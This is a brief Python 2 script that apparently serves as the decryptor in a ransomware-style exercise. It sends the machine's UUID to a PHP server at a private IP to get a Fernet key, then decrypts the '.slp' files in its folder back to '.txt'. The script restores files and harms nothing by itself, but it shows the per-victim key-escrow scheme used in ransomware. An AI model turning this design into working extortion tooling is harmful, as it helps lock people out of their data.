import requests, os, re, subprocess, StringIO
from cryptography.fernet import Fernet

x = subprocess.check_output('wmic csproduct get UUID')
content = x.split("\n")[1]

url = "http://10.101.200.34/cr2.php?args="
r = requests.get(url + "\"" + content + "\"")
key = r.text
key = key.strip()
print "Ceci est la cle : " + key

file_list = os.listdir(".")

for filename in file_list:
    if filename.endswith('.slp'):

        # Open slp file
        fic = open(filename,"r")
        msg = fic.read()
        msg = msg.encode("utf8")

        # Decrypt the "slp" file content 
        f = Fernet(key)
        token2 = f.decrypt(msg)

        # Re-create the original file
        filename2 = filename.split(".")[0] + ".txt"
        fic = open(filename2, "w")
        fic.write(token2)
        fic.close()
